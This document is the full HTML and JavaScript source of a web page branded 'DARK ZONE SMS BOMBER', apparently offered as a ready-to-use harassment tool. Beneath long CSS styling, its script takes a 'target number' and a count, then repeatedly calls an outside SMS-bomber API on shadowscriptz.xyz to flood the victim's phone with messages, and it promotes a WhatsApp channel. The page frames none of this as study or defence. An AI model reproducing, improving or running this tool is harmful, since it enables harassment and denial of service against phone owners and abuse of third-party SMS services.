<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DARK ZONE SMS BOMBER | </title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Reset & Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        :root {
            --matrix-green: #00ff41;
            --hacker-green: #0aff0a;
            --neon-green: #39ff14;
            --dark-green: #003b00;
            --cyber-green: #00d400;
            --terminal-green: #00ff00;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
            --panel-bg: rgba(10, 20, 10, 0.92);
            --terminal-bg: rgba(0, 20, 0, 0.8);
            --glow: 0 0 10px var(--matrix-green), 0 0 20px var(--matrix-green);
            --soft-glow: 0 0 5px rgba(0, 255, 65, 0.3);
            --cyber-glow: 0 0 15px rgba(0, 255, 65, 0.5);
            --scanline: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 65, 0.03) 2px, rgba(0, 255, 65, 0.03) 4px);
        }

        html {
            font-size: 16px;
            height: 100%;
            overflow-x: hidden;
        }

        body {
            font-family: 'Rajdhani', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: var(--dark-bg);
            min-height: 100vh;
            min-height: -webkit-fill-available;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
            position: relative;
            overflow-x: hidden;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }

        /* Matrix background */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, rgba(0, 20, 0, 0.5) 0%, rgba(0, 0, 0, 0.95) 80%);
            z-index: -3;
        }

        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--scanline);
            z-index: -2;
            opacity: 0.15;
            pointer-events: none;
        }

        /* Main Container */
        .container {
            background: var(--panel-bg);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border-radius: 12px;
            padding: 25px 20px;
            width: 100%;
            max-width: 500px;
            border: 1px solid rgba(0, 255, 65, 0.25);
            box-shadow: var(--cyber-glow), inset 0 0 20px rgba(0, 20, 0, 0.5);
            position: relative;
            overflow: hidden;
            margin: auto;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--matrix-green), transparent);
            animation: scanline 4s linear infinite;
        }

        @keyframes scanline {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 25px;
            position: relative;
        }

        .logo {
            font-family: 'Orbitron', monospace;
            font-size: 2.5rem;
            font-weight: 900;
            color: var(--matrix-green);
            text-shadow: var(--glow);
            margin-bottom: 5px;
            letter-spacing: 2px;
            position: relative;
            display: inline-block;
            line-height: 1.2;
        }

        .logo::after {
            content: 'â–ˆ';
            position: absolute;
            right: -24px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--terminal-green);
            animation: blink 1s infinite;
            font-size: 1.5rem;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .subtitle {
            color: var(--hacker-green);
            font-size: 1rem;
            font-weight: 600;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }

        .tagline {
            color: #aaa;
            font-size: 0.8rem;
            font-weight: 300;
            letter-spacing: 0.5px;
            border-top: 1px solid rgba(0, 255, 65, 0.15);
            padding-top: 10px;
            margin-top: 10px;
            line-height: 1.4;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-bottom: 25px;
        }

        @media (min-width: 480px) {
            .stats-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }

        .stat-box {
            background: rgba(0, 20, 0, 0.4);
            border: 1px solid rgba(0, 255, 65, 0.1);
            border-radius: 6px;
            padding: 12px 8px;
            text-align: center;
            transition: all 0.3s ease;
            min-height: 70px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .stat-value {
            color: var(--matrix-green);
            font-size: 1.5rem;
            font-weight: 700;
            font-family: 'Orbitron', monospace;
            margin-bottom: 4px;
            text-shadow: 0 0 5px var(--matrix-green);
            line-height: 1.2;
        }

        .stat-label {
            color: #aaa;
            font-size: 0.7rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            line-height: 1.3;
        }

        /* Terminal */
        .terminal {
            background: var(--terminal-bg);
            border: 1px solid rgba(0, 255, 65, 0.2);
            border-radius: 6px;
            padding: 20px 16px;
            margin-bottom: 20px;
            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.7);
            position: relative;
        }

        .terminal::before {
            content: 'TERMINAL';
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--dark-bg);
            color: var(--matrix-green);
            font-size: 0.7rem;
            padding: 0 10px;
            letter-spacing: 1px;
            font-weight: 600;
            font-family: 'Orbitron', monospace;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-label {
            display: block;
            color: var(--neon-green);
            font-size: 0.9rem;
            font-weight: 600;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            font-family: 'Orbitron', monospace;
        }

        .input-label i {
            margin-right: 8px;
            color: var(--cyber-green);
            font-size: 1rem;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper::before {
            content: '>';
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--matrix-green);
            font-weight: bold;
            z-index: 1;
            font-family: 'Orbitron', monospace;
            font-size: 1.1rem;
        }

        .cyber-input {
            width: 100%;
            padding: 15px 15px 15px 36px;
            background: rgba(0, 10, 0, 0.85);
            border: 1px solid rgba(0, 255, 65, 0.25);
            border-radius: 6px;
            color: var(--terminal-green);
            font-size: 1rem;
            font-weight: 500;
            font-family: 'Courier New', monospace;
            transition: all 0.3s ease;
            -webkit-appearance: none;
            appearance: none;
        }

        .cyber-input:focus {
            outline: none;
            border-color: var(--matrix-green);
            box-shadow: 0 0 12px rgba(0, 255, 65, 0.25);
            background: rgba(0, 20, 0, 0.9);
        }

        .cyber-input::placeholder {
            color: rgba(0, 255, 65, 0.4);
            font-weight: 300;
            font-size: 0.9rem;
        }

        /* Execute Button */
        .execute-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, rgba(0, 60, 0, 0.9), rgba(0, 30, 0, 0.9));
            border: 1px solid var(--matrix-green);
            color: var(--terminal-green);
            font-size: 1.1rem;
            font-weight: 700;
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            margin-top: 10px;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            user-select: none;
            min-height: 50px;
        }

        .execute-btn:active {
            background: linear-gradient(135deg, rgba(0, 80, 0, 0.9), rgba(0, 40, 0, 0.9));
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.3);
            transform: scale(0.98);
        }

        .execute-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        /* Progress Container */
        .progress-container {
            margin-top: 18px;
            display: none;
        }

        .progress-label {
            color: var(--neon-green);
            font-size: 0.85rem;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            font-family: 'Orbitron', monospace;
        }

        .cyber-progress {
            height: 8px;
            background: rgba(0, 20, 0, 0.8);
            border-radius: 4px;
            overflow: hidden;
            border: 1px solid rgba(0, 255, 65, 0.2);
            box-shadow: inset 0 0 8px rgba(0, 0, 0, 0.5);
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--dark-green), var(--cyber-green), var(--matrix-green));
            width: 0%;
            transition: width 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            animation: progressShine 2s infinite;
        }

        @keyframes progressShine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* Status Terminal */
        .status-terminal {
            background: rgba(0, 10, 0, 0.9);
            border: 1px solid rgba(0, 255, 65, 0.2);
            border-radius: 6px;
            padding: 16px;
            margin-top: 20px;
            min-height: 70px;
            font-family: 'Courier New', monospace;
            color: var(--terminal-green);
            font-size: 0.85rem;
            line-height: 1.5;
            display: none;
            position: relative;
            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.7);
            overflow-y: auto;
            max-height: 150px;
            word-break: break-word;
        }

        .status-terminal::before {
            content: 'SYSTEM LOG';
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--dark-bg);
            color: var(--matrix-green);
            font-size: 0.7rem;
            padding: 0 10px;
            letter-spacing: 1px;
            font-weight: 600;
            font-family: 'Orbitron', monospace;
        }

        /* Footer */
        .footer {
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid rgba(0, 255, 65, 0.1);
            text-align: center;
        }

        .powered-by {
            color: #666;
            font-size: 0.8rem;
            margin-bottom: 15px;
            letter-spacing: 0.5px;
            line-height: 1.4;
        }

        .powered-by span {
            color: var(--matrix-green);
            font-weight: 700;
            font-family: 'Orbitron', monospace;
        }

        .whatsapp-channel {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: linear-gradient(135deg, rgba(0, 40, 0, 0.9), rgba(0, 20, 0, 0.9));
            color: var(--matrix-green);
            padding: 14px 25px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: 700;
            font-size: 0.9rem;
            border: 1px solid rgba(0, 255, 65, 0.25);
            transition: all 0.3s ease;
            font-family: 'Orbitron', monospace;
            letter-spacing: 0.5px;
            width: 100%;
            max-width: 280px;
            margin: 0 auto;
        }

        .whatsapp-channel:active {
            background: linear-gradient(135deg, rgba(0, 60, 0, 0.9), rgba(0, 30, 0, 0.9));
            border-color: var(--matrix-green);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.25);
            transform: scale(0.98);
        }

        /* Mobile Optimizations */
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            
            .container {
                padding: 20px 15px;
            }
            
            .logo {
                font-size: 2rem;
            }
            
            .logo::after {
                right: -20px;
                font-size: 1.2rem;
            }
            
            .subtitle {
                font-size: 0.9rem;
            }
            
            .cyber-input, .execute-btn {
                min-height: 48px;
            }
            
            .stat-box {
                min-height: 65px;
            }
        }

        /* Landscape Mode */
        @media (orientation: landscape) and (max-height: 600px) {
            body {
                align-items: flex-start;
                padding: 10px;
            }
            
            .container {
                margin: 10px auto;
                max-width: 95%;
            }
            
            .stats-grid {
                grid-template-columns: repeat(4, 1fr);
                gap: 10px;
                margin-bottom: 15px;
            }
            
            .status-terminal {
                max-height: 80px;
                min-height: 60px;
            }
        }

        /* Prevent zoom on input focus for iOS */
        @media screen and (max-width: 768px) {
            input, select, textarea {
                font-size: 16px !important;
            }
        }

        /* Touch feedback */
        .execute-btn:active, .whatsapp-channel:active {
            transition: transform 0.1s;
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="scanlines"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">DARK ZONE</div>
            <div class="subtitle">SMS BOMBER </div>
            <div class="tagline">Dark Zone Tool</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-box">
                <div class="stat-value" id="totalSent">0</div>
                <div class="stat-label">SMS SENT</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="successRate">100%</div>
                <div class="stat-label">SUCCESS RATE</div>
            </div>
            <div class="stat-box">
                <div class="stat-value">âˆž</div>
                <div class="stat-label">POWER</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="speed">0ms</div>
                <div class="stat-label">RESPONSE TIME</div>
            </div>
        </div>
        
        <div class="terminal">
            <form id="bomberForm">
                <div class="form-group">
                    <label class="input-label">
                        <i class="fas fa-mobile-alt"></i>
                        TARGET NUMBER
                    </label>
                    <div class="input-wrapper">
                        <input type="tel" id="phoneNumber" class="cyber-input" placeholder="923297342824" required inputmode="numeric">
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="input-label">
                        <i class="fas fa-bomb"></i>
                        MESSAGE COUNT
                    </label>
                    <div class="input-wrapper">
                        <input type="number" id="registerAmount" class="cyber-input" placeholder="10" min="1" max="100" required inputmode="numeric">
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="input-label">
                        <i class="fas fa-clock"></i>
                        DELAY (SECONDS)
                    </label>
                    <div class="input-wrapper">
                        <input type="number" id="delaySeconds" class="cyber-input" placeholder="5" min="1" max="60" required inputmode="numeric">
                    </div>
                </div>
                
                <button type="submit" class="execute-btn" id="startButton">
                    <i class="fas fa-terminal"></i>
                   BOOM ðŸ’¥ 
                </button>
                
                <div class="progress-container" id="progressContainer">
                    <div class="progress-label">
                        <span>PROGRESS</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="cyber-progress">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                </div>
            </form>
        </div>
        
        <div class="status-terminal" id="statusMessage">
            <div id="statusContent">INITIALIZING SYSTEM... READY.</div>
        </div>
        
        <div class="footer">
            <div class="powered-by">POWERED BY <span>DARK-TECH-ZONE</span></div>
            <a href="https://whatsapp.com/channel/0029VbBWrHxDOQIa119G8545" class="whatsapp-channel" target="_blank" rel="noopener">
                <i class="fab fa-whatsapp"></i>
                JOIN CHANNEL
            </a>
        </div>
    </div>

    <script>
        // DOM Elements
        const form = document.getElementById('bomberForm');
        const startButton = document.getElementById('startButton');
        const statusMessage = document.getElementById('statusMessage');
        const statusContent = document.getElementById('statusContent');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        const progressPercent = document.getElementById('progressPercent');
        const totalSent = document.getElementById('totalSent');
        const successRate = document.getElementById('successRate');
        const speed = document.getElementById('speed');

        // Initialize stats
        let totalMessagesSent = 0;
        let successfulMessages = 0;
        let isProcessing = false;

        // Mobile detection
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

        // Update stats display
        function updateStats(success = true) {
            if (success) {
                totalMessagesSent++;
                successfulMessages++;
            } else {
                totalMessagesSent++;
            }
            
            totalSent.textContent = totalMessagesSent;
            const rate = totalMessagesSent > 0 ? Math.round((successfulMessages / totalMessagesSent) * 100) : 100;
            successRate.textContent = rate + '%';
        }

        // Write to terminal
        function writeToTerminal(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            let prefix = '';
            let color = '#00ff41';
            
            switch(type) {
                case 'success':
                    prefix = '[âœ“]';
                    color = '#00ff41';
                    break;
                case 'error':
                    prefix = '[âœ—]';
                    color = '#ff0040';
                    break;
                case 'warning':
                    prefix = '[!]';
                    color = '#ffff00';
                    break;
                default:
                    prefix = '[>]';
                    color = '#00ffff';
            }
            
            // Mobile-optimized: shorter messages
            const displayMessage = isMobile && message.length > 60 ? message.substring(0, 57) + '...' : message;
            
            statusContent.innerHTML = `<span style="color: ${color}">${prefix} ${timestamp} - ${displayMessage}</span>`;
            statusMessage.style.display = 'block';
            
            // Auto-scroll to bottom
            setTimeout(() => {
                statusMessage.scrollTop = statusMessage.scrollHeight;
            }, 10);
        }

        // Update progress bar
        function updateProgress(percentage) {
            const percent = Math.min(100, Math.max(0, percentage));
            progressFill.style.width = percent + '%';
            progressPercent.textContent = Math.round(percent) + '%';
        }

        // Show/hide progress
        function showProgress() {
            progressContainer.style.display = 'block';
        }

        function hideProgress() {
            progressContainer.style.display = 'none';
            updateProgress(0);
        }

        // API call function
        async function callAPI(phoneNumber) {
            const startTime = Date.now();
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${phoneNumber}`;
            
            try {
                // Using fetch with no-cors mode
                await fetch(apiUrl, {
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                
                const endTime = Date.now();
                const responseTime = endTime - startTime;
                speed.textContent = responseTime + 'ms';
                
                return { success: true, responseTime };
            } catch (error) {
                console.log('API call error:', error);
                return { success: false, error: 'Network error' };
            }
        }

        // Form submission handler
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Prevent multiple submissions
            if (isProcessing) return;
            
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const registerAmount = parseInt(document.getElementById('registerAmount').value);
            const delaySeconds = parseInt(document.getElementById('delaySeconds').value);
            
            // Validation
            if (!phoneNumber || !registerAmount || !delaySeconds) {
                writeToTerminal('ERROR: ALL FIELDS REQUIRED', 'error');
                return;
            }
            
            if (phoneNumber.length < 10) {
                writeToTerminal('ERROR: INVALID PHONE NUMBER', 'error');
                return;
            }
            
            if (registerAmount < 1 || registerAmount > 100) {
                writeToTerminal('ERROR: COUNT MUST BE 1-100', 'error');
                return;
            }
            
            if (delaySeconds < 1 || delaySeconds > 60) {
                writeToTerminal('ERROR: DELAY MUST BE 1-60 SECONDS', 'error');
                return;
            }
            
            // Set processing flag
            isProcessing = true;
            
            // Disable button and show progress
            startButton.disabled = true;
            startButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            showProgress();
            
            // Vibrate on mobile if supported
            if (navigator.vibrate) {
                navigator.vibrate(50);
            }
            
            writeToTerminal(`STARTING: ${registerAmount} SMS TO ${phoneNumber}`, 'info');
            
            try {
                for (let i = 0; i < registerAmount; i++) {
                    // Update progress
                    const progress = ((i + 1) / registerAmount) * 100;
                    updateProgress(progress);
                    
                    writeToTerminal(`SENDING ${i + 1}/${registerAmount}...`, 'info');
                    
                    // Call the API
                    const result = await callAPI(phoneNumber);
                    
                    if (result.success) {
                        writeToTerminal(`SENT ${i + 1} SUCCESS`, 'success');
                        updateStats(true);
                    } else {
                        writeToTerminal(`FAILED AT ${i + 1}`, 'error');
                        updateStats(false);
                        break;
                    }
                    
                    // Wait for delay (except for the last iteration)
                    if (i < registerAmount - 1) {
                        writeToTerminal(`WAITING ${delaySeconds}S...`, 'warning');
                        await new Promise(resolve => setTimeout(resolve, delaySeconds * 1000));
                    }
                }
                
                updateProgress(100);
                writeToTerminal(`COMPLETE: ${registerAmount} SMS DELIVERED`, 'success');
                
                // Success vibration pattern on mobile
                if (navigator.vibrate) {
                    navigator.vibrate([100, 50, 100]);
                }
                
            } catch (error) {
                writeToTerminal(`SYSTEM ERROR: ${error.message}`, 'error');
                updateStats(false);
            } finally {
                // Reset processing flag
                isProcessing = false;
                
                // Re-enable button
                startButton.disabled = false;
                startButton.innerHTML = '<i class="fas fa-terminal"></i> EXECUTE';
                
                // Hide progress after 3 seconds
                setTimeout(() => {
                    hideProgress();
                }, 3000);
            }
        });

        // Input validation and formatting
        document.getElementById('phoneNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
        });

        document.getElementById('registerAmount').addEventListener('input', function(e) {
            let value = parseInt(e.target.value) || 0;
            if (value > 100) e.target.value = 100;
            if (value < 1) e.target.value = 1;
        });

        document.getElementById('delaySeconds').addEventListener('input', function(e) {
            let value = parseInt(e.target.value) || 0;
            if (value > 60) e.target.value = 60;
            if (value < 1) e.target.value = 1;
        });

        // Initialize on page load
        window.addEventListener('load', () => {
            // Set initial status
            writeToTerminal('SYSTEM READY. ENTER TARGET DETAILS.', 'info');
            
            // Focus on first input
            setTimeout(() => {
                document.getElementById('phoneNumber').focus();
            }, 500);
        });

        // Handle orientation change
        window.addEventListener('orientationchange', function() {
            setTimeout(() => {
                writeToTerminal('ORIENTATION CHANGED - SYSTEM STABLE', 'info');
            }, 300);
        });

        // Prevent form resubmission on refresh
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                startButton.disabled = false;
                startButton.innerHTML = '<i class="fas fa-terminal"></i> EXECUTE';
                hideProgress();
                isProcessing = false;
            }
        });
    </script>
</body>
</html>
